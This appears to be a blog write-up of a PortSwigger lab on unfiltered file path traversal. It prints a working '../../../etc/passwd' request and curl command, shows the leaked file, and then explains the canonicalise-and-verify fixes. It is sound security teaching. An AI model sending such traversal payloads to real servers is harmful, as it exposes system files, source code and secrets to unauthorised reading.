---
layout: post
title: "PortSwigger: File Path Traversal, Simple Case"
date: 2027-09-19 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, PathTraversal]
tags: [portswigger, path-traversal, directory-traversal, lfi, file-read, etc-passwd, cwe-22]
---

Every product picture in the shop is loaded through one little endpoint: you hand it a filename, it reads that file off disk and streams it back. The trouble is the server believes whatever filename you give it — including one that says "go up three directories and grab `/etc/passwd` instead." This lab is the friendliest possible flavour of [path traversal](https://cwe.mitre.org/data/definitions/22.html): there's no filter to defeat, so a plain `../../../` walks straight out of the image folder and reads any file on the box.

## Overview

The lab is a single [file path traversal](https://cwe.mitre.org/data/definitions/22.html) ([CWE-22](https://cwe.mitre.org/data/definitions/22.html)) issue, the "simple case" — no defences at all. The image loader takes a `filename` query parameter, glues it onto the image directory path, and reads the resulting file with no validation. Supplying a relative path full of `../` segments escapes the intended directory and reads arbitrary files. The objective is to read `/etc/passwd`.

## The technique

Every product image is served like this:

```
GET /image?filename=1.jpg
```

Behind the scenes the application builds a filesystem path roughly equal to `imagesDir + "/" + filename` and reads it. Because the `filename` you send is trusted completely, you can replace it with a **traversal sequence**. Each `../` climbs one directory toward the filesystem root; once you're at `/`, you descend to whatever you want:

```
GET /image?filename=../../../etc/passwd
```

Three `../` segments are enough to climb from the image directory up to `/`. Any extra `../` is harmless — you can't go higher than root — so you don't even need to count directories precisely. From root, `etc/passwd` is a universally readable proof-of-concept target.

## The working request

```
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: <instance>.web-security-academy.net
```

With `curl`:

```bash
curl -sk "https://<instance>.web-security-academy.net/image?filename=../../../etc/passwd"
```

The server responds **HTTP 200** with the raw contents of `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
```

The instant the back-end serves a file from outside the image directory, the lab status flips to **Solved**.

## Why it worked

The application did three things wrong, all of which had to be absent for the attack to land cleanly:

- **No canonicalisation** — it never resolved `../` to compute the *real* target path before reading.
- **No filtering** — this is the simple case, so there's no `../` stripping or encoding check to bypass.
- **No containment check** — it never verified that the final, resolved path still lived inside the intended image directory.

Put together, the `filename` parameter was a direct steering wheel for the server's file-reading API. `/etc/passwd` is just the demonstration; the same primitive reads application source code, configuration files, and secrets (`.env`, private keys) — anything the web process can read.

## The fix

- **Best:** don't pass user input to filesystem APIs at all. Map an opaque ID to a server-side filename via a lookup table / whitelist, so the user never names a path.
- If you must use the input, **canonicalise then verify**: resolve the path to its absolute real form (e.g. `realpath`) and confirm it still begins with the intended base directory before opening it. Reject anything that escapes.
- Strip or reject `../`, encoded variants (`..%2f`, `....//`), and null bytes as **defence-in-depth only** — filter-only approaches are routinely bypassed and should never be the primary control.

## References

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- OWASP A01:2021 – Broken Access Control
